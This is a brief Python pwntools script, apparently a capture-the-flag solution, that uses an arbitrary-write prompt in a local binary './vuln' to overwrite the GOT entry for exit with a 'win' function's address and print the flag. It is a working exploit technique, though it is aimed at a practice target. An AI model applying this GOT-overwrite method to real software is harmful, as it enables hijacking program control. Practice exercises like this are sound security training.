#!/usr/bin/env python

from pwn import *

context.log_level = 'error'

#setup process and ELF
p = process('./vuln')
e = ELF('./vuln')

#get exit and win
win = e.symbols['win']
exit = e.got['exit']

#overwrite got exit with win
p.sendlineafter('Input address\n', str(exit))
p.sendlineafter('Input value?\n', str(win))


#print the flag(hopefully)
p.recv()
p.recvuntil('\n')
print p.recv()

p.close()

